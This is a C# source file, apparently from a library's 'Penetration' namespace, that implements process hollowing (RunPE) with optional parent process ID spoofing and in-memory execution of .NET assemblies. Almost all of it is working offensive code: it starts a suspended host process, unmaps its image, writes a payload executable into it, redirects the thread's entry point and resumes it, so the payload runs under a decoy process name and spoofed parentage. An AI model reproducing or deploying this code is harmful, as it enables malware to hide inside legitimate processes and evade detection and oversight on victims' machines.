using BytecodeApi.Extensions;
using BytecodeApi.Threading;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

namespace BytecodeApi.Penetration;

/// <summary>
/// Class that executes executable (.exe) files in memory.
/// </summary>
public static class ExecutableInjection
{
	/// <summary>
	/// Creates a new process using the process hollowing technique. If process creation failed, an exception is thrown.
	/// <para>The bitness of the current process, the created process and the payload must match.</para>
	/// </summary>
	/// <param name="path">The target executable path. This can be any existing file with the same bitness as the current process and <paramref name="payload" />.</param>
	/// <param name="commandLine">The commandline of the created process. This parameter is displayed in task managers, but is otherwise unused.</param>
	/// <param name="payload">The actual executable that is the payload of the new process, regardless of <paramref name="path" /> and <paramref name="commandLine" />.</param>
	public static void RunPE(string path, string? commandLine, byte[] payload)
	{
		RunPE(path, commandLine, payload, null);
	}
	/// <summary>
	/// Creates a new process using the process hollowing technique. If process creation failed, an exception is thrown.
	/// <para>The bitness of the current process, the created process and the payload must match.</para>
	/// </summary>
	/// <param name="path">The target executable path. This can be any existing file with the same bitness as the current process and <paramref name="payload" />.</param>
	/// <param name="commandLine">The commandline of the created process. This parameter is displayed in task managers, but is otherwise unused.</param>
	/// <param name="payload">The actual executable that is the payload of the new process, regardless of <paramref name="path" /> and <paramref name="commandLine" />.</param>
	/// <param name="parentProcessId">The spoofed parent process ID, or <see langword="null" /> to not spoof the parent process ID.</param>
	public static void RunPE(string path, string? commandLine, byte[] payload, int? parentProcessId)
	{
		Check.ArgumentNull(path);
		Check.FileNotFound(path);
		Check.ArgumentNull(payload);
		Check.Format(payload.Length >= 512 && payload[0] == 'M' && payload[1] == 'Z', "The payload is not a valid executable.");

		// For 32-bit (and 64-bit?) process hollowing, this needs to be attempted several times.
		// This is a workaround to the well known stability issue of process hollowing.
		for (int i = 0; i < 5; i++)
		{
			int processId = 0;

			try
			{
				int ntHeaders = BitConverter.ToInt32(payload, 0x3c);
				int sizeOfImage = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x38);
				int sizeOfHeaders = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x3c);
				int entryPoint = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x10);
				short numberOfSections = BitConverter.ToInt16(payload, ntHeaders + 0x6);
				short sizeOfOptionalHeader = BitConverter.ToInt16(payload, ntHeaders + 0x14);
				nint imageBase = nint.Size == 4 ? BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x1c) : (nint)BitConverter.ToInt64(payload, ntHeaders + 0x18 + 0x18);

				nint parentProcessHandle = 0;
				nint parentProcessHandlePtr = 0;
				nint attributeListSize = 0;
				nint attributeList = 0;

				int startupInfoLength = (nint.Size == 8, parentProcessId != null) switch
				{
					(false, false) => 0x44,
					(true, false) => 0x68,
					(false, true) => 0x48,
					(true, true) => 0x70
				};
				nint startupInfo = Allocate(startupInfoLength);
				Marshal.Copy(new byte[startupInfoLength], 0, startupInfo, startupInfoLength);
				Marshal.WriteInt32(startupInfo, startupInfoLength);

				if (parentProcessId != null)
				{
					// Use STARTUPINFOEX to implement parent process spoofing
					parentProcessHandle = Native.OpenProcess(0x80, false, parentProcessId.Value);
					if (parentProcessHandle == 0) throw new Exception();

					parentProcessHandlePtr = Allocate(nint.Size);
					Marshal.WriteIntPtr(parentProcessHandlePtr, parentProcessHandle);

					if (Native.InitializeProcThreadAttributeList(0, 1, 0, ref attributeListSize) || attributeListSize == 0) throw new Exception();

					attributeList = Allocate((int)attributeListSize);
					if (!Native.InitializeProcThreadAttributeList(attributeList, 1, 0, ref attributeListSize) ||
						attributeList == 0 ||
						!Native.UpdateProcThreadAttribute(attributeList, 0, 0x20000, parentProcessHandlePtr, nint.Size, 0, 0)) throw new Exception();

					Marshal.WriteIntPtr(startupInfo, startupInfoLength - nint.Size, attributeList);
				}

				byte[] processInfo = new byte[nint.Size == 4 ? 0x10 : 0x18];

				nint context = Allocate(nint.Size == 4 ? 0x2cc : 0x4d0);
				Marshal.WriteInt32(context, nint.Size == 4 ? 0 : 0x30, 0x10001b);

				if (!Native.CreateProcess(path, path + " " + commandLine, 0, 0, true, (parentProcessId != null ? 0x80000u : 0u) | 0x4u, 0, null!, startupInfo, processInfo)) throw new Exception();
				processId = BitConverter.ToInt32(processInfo, nint.Size * 2);
				nint process = nint.Size == 4 ? BitConverter.ToInt32(processInfo, 0) : (nint)BitConverter.ToInt64(processInfo, 0);

				Native.NtUnmapViewOfSection(process, imageBase);

				nint sizeOfImagePtr = sizeOfImage;
				if (Native.NtAllocateVirtualMemory(process, ref imageBase, 0, ref sizeOfImagePtr, 0x3000, 0x40) < 0 ||
					Native.NtWriteVirtualMemory(process, imageBase, payload, sizeOfHeaders, 0) < 0) throw new Exception();

				for (short j = 0; j < numberOfSections; j++)
				{
					byte[] section = payload.GetBytes(ntHeaders + 0x18 + sizeOfOptionalHeader + j * 0x28, 0x28);

					int virtualAddress = BitConverter.ToInt32(section, 0xc);
					int sizeOfRawData = BitConverter.ToInt32(section, 0x10);
					int pointerToRawData = BitConverter.ToInt32(section, 0x14);

					byte[] rawData = payload.GetBytes(pointerToRawData, sizeOfRawData);
					if (Native.NtWriteVirtualMemory(process, (nint)((long)imageBase + virtualAddress), rawData, rawData.Length, 0) < 0) throw new Exception();
				}

				nint thread = nint.Size == 4 ? BitConverter.ToInt32(processInfo, 4) : (nint)BitConverter.ToInt64(processInfo, 8);
				if (Native.NtGetContextThread(thread, context) < 0) throw new Exception();

				if (nint.Size == 4)
				{
					nint ebx = Marshal.ReadInt32(context, 0xa4);
					if (Native.NtWriteVirtualMemory(process, (int)ebx + 8, BitConverter.GetBytes((int)imageBase), 4, 0) < 0) throw new Exception();
					Marshal.WriteInt32(context, 0xb0, (int)imageBase + entryPoint);
				}
				else
				{
					nint rdx = (nint)Marshal.ReadInt64(context, 0x88);
					if (Native.NtWriteVirtualMemory(process, (nint)((long)rdx + 16), BitConverter.GetBytes((long)imageBase), 8, 0) < 0) throw new Exception();
					Marshal.WriteInt64(context, 0x80, (long)imageBase + entryPoint);
				}

				if (Native.NtSetContextThread(thread, context) < 0) throw new Exception();
				if (Native.NtResumeThread(thread, out _) == -1) throw new Exception();

				return;
			}
			catch
			{
				try
				{
					// If the current attempt failed, terminate the created process to not have suspended "leftover" processes.
					if (processId > 0)
					{
						using Process process = Process.GetProcessById(processId);
						process.Kill();
					}
				}
				catch
				{
				}
			}
		}

		throw Throw.InvalidOperation("Failed to create process using process hollowing.");

		static nint Allocate(int size)
		{
			int alignment = nint.Size == 4 ? 1 : 16;
			return (nint)(((long)Marshal.AllocHGlobal(size + alignment / 2) + (alignment - 1)) / alignment * alignment);
		}
	}
	/// <summary>
	/// Executes a .NET executable from a <see cref="byte" />[] by invoking the main entry point. The Main method must either have no parameters or one <see cref="string" />[] parameter. If it has a parameter, <see langword="new" /> <see cref="string" />[0] is passed.
	/// </summary>
	/// <param name="executable">A <see cref="byte" />[] that represents a .NET executable file.</param>
	public static void ExecuteDotNetAssembly(byte[] executable)
	{
		ExecuteDotNetAssembly(executable, null);
	}
	/// <summary>
	/// Executes a .NET executable from a <see cref="byte" />[] by invoking the main entry point. The Main method must either have no parameters or one <see cref="string" />[] parameter. If it has a parameter, <paramref name="args" /> is passed, otherwise <paramref name="args" /> is ignored.
	/// </summary>
	/// <param name="executable">A <see cref="byte" />[] that represents a .NET executable file.</param>
	/// <param name="args">A <see cref="string" />[] representing the arguments that is passed to the main entry point, if the Main method has a <see cref="string" />[] parameter.</param>
	public static void ExecuteDotNetAssembly(byte[] executable, params string?[]? args)
	{
		ExecuteDotNetAssembly(executable, args, false);
	}
	/// <summary>
	/// Executes a .NET executable from a <see cref="byte" />[] by invoking the main entry point. The Main method must either have no parameters or one <see cref="string" />[] parameter. If it has a parameter, <paramref name="args" /> is passed, otherwise <paramref name="args" /> is ignored.
	/// </summary>
	/// <param name="executable">A <see cref="byte" />[] that represents a .NET executable file.</param>
	/// <param name="args">A <see cref="string" />[] representing the arguments that is passed to the main entry point, if the Main method has a <see cref="string" />[] parameter.</param>
	/// <param name="thread"><see langword="true" /> to invoke the main entry point in a new thread.</param>
	public static void ExecuteDotNetAssembly(byte[] executable, string?[]? args, bool thread)
	{
		Check.ArgumentNull(executable);

		MethodInfo method = Assembly.Load(executable).EntryPoint ?? throw Throw.Win32("Could not find assembly entry point. The assembly must be an executable, not a DLL.");
		ParameterInfo[] parameters = method.GetParameters();

		Action invoke;

		if (parameters.Length == 0)
		{
			invoke = () => method.Invoke();
		}
		else if (parameters.Length == 1 && parameters.First().ParameterType == typeof(string[]))
		{
			invoke = () => method.Invoke(null, [args ?? Array.Empty<string>()]);
		}
		else
		{
			throw Throw.InvalidOperation("Executable does not contain a static 'main' method suitable for an entry point.");
		}

		if (thread)
		{
			ThreadFactory.StartThread(invoke);
		}
		else
		{
			invoke();
		}
	}
}

file static class Native
{
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern nint OpenProcess(int access, bool inheritHandle, int processId);
	[DllImport("kernel32.dll")]
	public static extern bool CreateProcess(string applicationName, string commandLine, nint processAttributes, nint threadAttributes, bool inheritHandles, uint creationFlags, nint environment, string currentDirectory, nint startupInfo, byte[] processInformation);
	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern int NtAllocateVirtualMemory(nint process, ref nint address, nint zeroBits, ref nint size, uint allocationType, uint protect);
	[DllImport("ntdll.dll")]
	public static extern int NtWriteVirtualMemory(nint process, nint baseAddress, byte[] buffer, int size, nint bytesWritten);
	[DllImport("ntdll.dll")]
	public static extern uint NtUnmapViewOfSection(nint process, nint baseAddress);
	[DllImport("ntdll.dll")]
	public static extern int NtSetContextThread(nint thread, nint context);
	[DllImport("ntdll.dll")]
	public static extern int NtGetContextThread(nint thread, nint context);
	[DllImport("ntdll.dll")]
	public static extern int NtResumeThread(nint thread, out uint suspendCount);
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool InitializeProcThreadAttributeList(nint attributeList, int attributeCount, int flags, ref nint size);
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool UpdateProcThreadAttribute(nint attributeList, uint flags, nint attribute, nint value, nint size, nint previousValue, nint returnSize);
}